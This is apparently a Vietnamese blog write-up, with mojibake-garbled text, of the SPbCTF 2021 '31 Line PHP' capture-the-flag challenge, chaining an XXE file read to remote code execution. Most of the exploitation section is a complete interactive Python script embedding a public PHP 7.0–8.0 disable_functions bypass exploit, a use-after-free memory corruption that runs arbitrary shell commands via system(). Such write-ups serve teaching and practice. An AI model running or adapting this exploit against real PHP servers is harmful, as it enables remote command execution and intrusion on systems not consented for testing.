---
title: 31 Line PHP - SPbCTF2021
description: From SPbCTF's Student CTF 2021 Quals
author: to^
date: 2022-04-05 23:35:00 +0700
categories: [WebSec, CTF, SPbCTF2021]
tags: [xxe, rce]     # TAG names should always be lowercase
img_path: /assets/img/
image:
 src: 31linephp/SPbCTF_logo.png
 alt: SPbCTF logo
 width: 1000
 height: 400
---
Challenge n√†y t·ª´ nƒÉm ngo√°i nh∆∞ng m√¨nh v·∫´n mu·ªën vi·∫øt b·ªüi 1 ph·∫ßn n√≥ kh√° hay v√† l√≠ do ngo√†i l·ªÅ kh√°c l√† nƒÉm nay m√¨nh m·ªõi t·∫≠p t√†nh vi·∫øt blog üòù 
## _Source code_
![source_code](31linephp/source.png)
_source code_

## _Ph√¢n t√≠ch_
Nh√¨n qua source code th√¨ ta s·∫Ω ph·∫£i POST d·ªØ li·ªáu `data=xxxx` v√† m·ªôt file. Server s·∫Ω check session c·ªßa ta n·∫øu kh√¥ng c√≥ th√¨ s·∫Ω t·∫°o random m·ªôt `sess_id` v√† d√πng  `sess_id` n√†y ƒë·ªÉ l√†m th∆∞ m·ª•c cha c·ªßa file upload.

2 d√≤ng comment kh√° th√∫ v·ªã, li√™n quan ƒë·∫øn l·ªói XXE c·ªßa Wordpress 3.9.2. Ti·∫øp t·ª•c search th√¨ m√¨nh t√¨m ra m·ªôt blog v·ªÅ m·ªôt bug kh√°c c≈©ng c·ªßa [Wordpress](https://blog.sonarsource.com/wordpress-xxe-security-vulnerability) li√™n quan ƒë·∫øn XXE. `libxml_disable_entity_loader(true)` ƒë∆∞·ª£c th√™m v√†o ·ªü ƒë√¢y ƒë·ªÉ config XML parser t·∫Øt t√≠nh nƒÉng load external entity v√† t√≠nh nƒÉng n√†y n√™n ƒë∆∞·ª£c √°p d·ª•ng v·ªõi c√°c version PHP < 8, k·ªÉ t·ª´ 8 tr·ªü ƒëi th√¨ PHP d√πng libxml t·ª´ version 2.9.0 (disable XXE bydefault) n√™n `libxml_disable_entity_loader()` kh√¥ng ƒë∆∞·ª£c d√πng n·ªØa.

T·ª´ ƒë√≥ ta c√≥ th·ªÉ th·∫•y kh√¥ng c√≥ v·∫•n ƒë·ªÅ g√¨ ·ªü ƒëo·∫°n code n√†y nh∆∞ng `loadXML()` ·ªü d√≤ng code d∆∞·ªõi th√¨ sao?. B·ªüi v√¨ n√≥ ƒë∆∞·ª£c th·ª±c thi v·ªõi flag `LIBXML_NOENT`  n√™n s·∫Ω `enable entity substitution`. C·ª• th·ªÉ h∆°n l√†:
![LIBXML_NOENT](31linephp/libxml_noent.png)
_LIBXML_NOENT_

V√¨ v·∫≠y ta v·∫´n c√≥ th·ªÉ l·ª£i d·ª•ng ƒëi·ªÅu n√†y ƒë·ªÉ √°p d·ª•ng kƒ© thu·∫≠t XXE üòä

Th·ª≠ upload m·ªôt file `test.xml`:
![test.xml](31linephp/test.png)
_test.html_

V·ªõi PHPSESSID trong cookie c·ªßa ta
![py script](31linephp/pyscript.png)
_python script_

Ta ƒë∆∞·ª£c:
![result](31linephp/result1.png)
_respone_

XXE th√†nh c√¥ng nh∆∞ng s·∫Ω kh√¥ng c√≥ c√°ch n√†o t√¨m ƒë∆∞·ª£c file flag v√¨ XXE theo c√°ch n√†y ch·ªâ c√≥ th·ªÉ retrieve file t·ª´ xa b√™n ph√≠a server üòê v√¨ v·∫≠y m√¨nh ƒë√£ kh√¥ng gi·∫£i ra.

Sau khi ƒë·ªçc wu th√¨ m·ªõi ph√°t hi·ªán ra r·∫±ng file ta upload l√™n ƒë∆∞·ª£c x√≥a ·ªü cu·ªëi `unlink()` sau khi ƒë∆∞·ª£c parse XML. ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† n·∫øu ta upload m·ªôt file PHP v√† truy c·∫≠p file ƒë√≥ m·ªôt l·∫ßn n·ªØa th√¥ng qua XML. V√† d√πng `php://filter` ƒë·ªÉ encode base64 th√¨ c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c output c·ªßa file php (sau khi th·ª±c thi b√™n ph√≠a server) qua response. ƒê·ªÉ √Ω m·ªôt ƒëi·ªÉm n·ªØa l√† file upload ƒë∆∞·ª£c l∆∞u t·∫°i th∆∞ m·ª•c `var/www/html/upload/$id/$name` n√™n suy ƒëo√°n th∆∞ m·ª•c root c·ªßa web server s·∫Ω l√† `/var/www/html`. Suy ra ta c√≥ th·ªÉ access ƒë·∫øn file upload b√™n ph√≠a server th√¥ng qua ƒë∆∞·ªùng d·∫´n <http://62.84.114.238/upload/$id/$FILENAME> 

```xml
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://62.84.114.238/upload/89e05a8b6e028eeda25a0845b9b3daaa/payload.php" >]>
<creds>
<user>&xxe;</user>

<pass></pass>

</creds>
<?php phpinfo(); ?>
```

Ta ch·ªânh l·∫°i file upload v·ªõi `phpinfo();` v√† ƒë·ªÉ server th·ª±c thi ƒë∆∞·ª£c file php th√¨ ch·ªânh lu√¥n extension th√†nh `.php`
![result](31linephp/result2.png)
_respone_

Th√†nh c√¥ng base64 decode v√† m·ªü b·∫±ng tr√¨nh duy·ªát:
![result](31linephp/result3.png)
_phpinfo_

üòë C√°c function c√≥ th·ªÉ d√πng ƒë·ªÉ rce ƒë·ªÅu b·ªã filter.

Nh∆∞ng c√°i `disable_functions` n√†y c√≥ th·ªÉ bypass ƒë∆∞·ª£c d·ª±a v√†o bug 0day ƒë∆∞·ª£c published [PoC](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass). 
T·∫°i th·ªùi ƒëi·ªÉm publish, bug n√†y c√≥ th·ªÉ d√πng ƒë·ªÉ bypass h·∫ßu nh∆∞ m·ªçi PHP versions v√† khai th√°c d·ª±a tr√™n `memory corruption`.

## _Khai th√°c_
```py
import requests
import re
import base64

TARGET = 'http://62.84.114.238'

while 1:
    COMMAND = str(input('$ '))
    with open('payload.php', 'w') as f:
        f.write("""
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://62.84.114.238/upload/ebb8f496d6241dfd214351614c852de7/payload.php" > ]>
<creds>
    <user>&xxe;</user>    
    <pass>mypass</pass>
</creds>
""" + """
<?php 
# PHP 7.0-8.0 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=54350
# 
# This exploit should work on all PHP 7.0-8.0 versions
# released as of 2021-10-06
#
# Author: https://github.com/mm0r1

pwn('{}');""".format(COMMAND) + r"""

function pwn($cmd) {
    define('LOGGING', false);
    define('CHUNK_DATA_SIZE', 0x60);
    define('CHUNK_SIZE', ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);
    define('FILTER_SIZE', ZEND_DEBUG_BUILD ? 0x70 : 0x50);
    define('STRING_SIZE', CHUNK_DATA_SIZE - 0x18 - 1);
    define('CMD', $cmd);
    for($i = 0; $i < 10; $i++) {
        $groom[] = Pwn::alloc(STRING_SIZE);
    }
    stream_filter_register('pwn_filter', 'Pwn');
    $fd = fopen('php://memory', 'w');
    stream_filter_append($fd,'pwn_filter');
    fwrite($fd, 'x');
}

class Helper { public $a, $b, $c; }
class Pwn extends php_user_filter {
    private $abc, $abc_addr;
    private $helper, $helper_addr, $helper_off;
    private $uafp, $hfp;

    public function filter($in, $out, &$consumed, $closing) {
        if($closing) return;
        stream_bucket_make_writeable($in);
        $this->filtername = Pwn::alloc(STRING_SIZE);
        fclose($this->stream);
        $this->go();
        return PSFS_PASS_ON;
    }

    private function go() {
        $this->abc = &$this->filtername;

        $this->make_uaf_obj();

        $this->helper = new Helper;
        $this->helper->b = function($x) {};

        $this->helper_addr = $this->str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;
        $this->log("helper @ 0x%x", $this->helper_addr);

        $this->abc_addr = $this->helper_addr - CHUNK_SIZE;
        $this->log("abc @ 0x%x", $this->abc_addr);

        $this->helper_off = $this->helper_addr - $this->abc_addr - 0x18;

        $helper_handlers = $this->str2ptr(CHUNK_SIZE);
        $this->log("helper handlers @ 0x%x", $helper_handlers);

        $this->prepare_leaker();

        $binary_leak = $this->read($helper_handlers + 8);
        $this->log("binary leak @ 0x%x", $binary_leak);
        $this->prepare_cleanup($binary_leak);

        $closure_addr = $this->str2ptr($this->helper_off + 0x38);
        $this->log("real closure @ 0x%x", $closure_addr);

        $closure_ce = $this->read($closure_addr + 0x10);
        $this->log("closure class_entry @ 0x%x", $closure_ce);

        $basic_funcs = $this->get_basic_funcs($closure_ce);
        $this->log("basic_functions @ 0x%x", $basic_funcs);

        $zif_system = $this->get_system($basic_funcs);
        $this->log("zif_system @ 0x%x", $zif_system);

        $fake_closure_off = $this->helper_off + CHUNK_SIZE * 2;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->write($fake_closure_off + 0x38, 1, 4);

        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->write($fake_closure_off + $handler_offset, $zif_system);

        $fake_closure_addr = $this->helper_addr + $fake_closure_off - $this->helper_off;
        $this->write($this->helper_off + 0x38, $fake_closure_addr);
        $this->log("fake closure @ 0x%x", $fake_closure_addr);

        $this->cleanup();
        ($this->helper->b)(CMD);
    }

    private function make_uaf_obj() {
        $this->uafp = fopen('php://memory', 'w');
        fwrite($this->uafp, pack('QQQ', 1, 0, 0xDEADBAADC0DE));
        for($i = 0; $i < STRING_SIZE; $i++) {
            fwrite($this->uafp, "\x00");
        }
    }

    private function prepare_leaker() {
        $str_off = $this->helper_off + CHUNK_SIZE + 8;
        $this->write($str_off, 2);
        $this->write($str_off + 0x10, 6);

        $val_off = $this->helper_off + 0x48;
        $this->write($val_off, $this->helper_addr + CHUNK_SIZE + 8);
        $this->write($val_off + 8, 0xA);
    }

    private function prepare_cleanup($binary_leak) {
        $ret_gadget = $binary_leak;
        do {
            --$ret_gadget;
        } while($this->read($ret_gadget, 1) !== 0xC3);
        $this->log("ret gadget = 0x%x", $ret_gadget);
        $this->write(0, $this->abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));
        $this->write(8, $ret_gadget);
    }

    private function read($addr, $n = 8) {
        $this->write($this->helper_off + CHUNK_SIZE + 16, $addr - 0x10);
        $value = strlen($this->helper->c);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }

    private function write($p, $v, $n = 8) {
        for($i = 0; $i < $n; $i++) {
            $this->abc[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    private function get_basic_funcs($addr) {
        while(true) {
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4),
                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) {
                    $this->log("standard module @ 0x%x", $addr);
                    return $this->read($addr + 0x28);
                }
            }
        }
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry !== 0);
    }

    private function cleanup() {
        $this->hfp = fopen('php://memory', 'w');
        fwrite($this->hfp, pack('QQ', 0, $this->abc_addr));
        for($i = 0; $i < FILTER_SIZE - 0x10; $i++) {
            fwrite($this->hfp, "\x00");
        }
    }

    private function str2ptr($p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($this->abc[$p + $j]);
        }
        return $address;
    }

    private function ptr2str($ptr, $n = 8) {
        $out = '';
        for ($i = 0; $i < $n; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    private function log($format, $val = '') {
        if(LOGGING) {
            printf("{$format}\n", $val);
        }
    }

    static function alloc($size) {
        return str_shuffle(str_repeat('A', $size));
    }
}
?>
""")
    r = requests.post(TARGET, files={'data': ('payload.php', open('payload.php', 'rb'))}, data={'data': 'test'},
                      headers={'Cookie': 'PHPSESSID=7b4bd8d9ff68e20dc0317595b6623ef6'})
    # print(r.text)
    match = re.search('You have logged in as user (.*)', r.text)
    extract_data = base64.b64decode(match[1]).decode()
    index = extract_data.find('</creds>') + len('</creds>')
    rce_data = extract_data[index:]
    print(rce_data)

```

K·∫øt qu·∫£:

![result](31linephp/result4.png)
_RCE sucess_

> spbctf{XX3_2_rCe_w3Ll_D0n3}
{: .prompt-info  }

## _Tham kh·∫£o_
- <https://blog.sonarsource.com/wordpress-xxe-security-vulnerability>
- <https://ctf.zeyu2001.com/2021/spbctfs-student-ctf-quals/31-line-php>
- <https://php.watch/versions/8.0/libxml_disable_entity_loader-deprecation>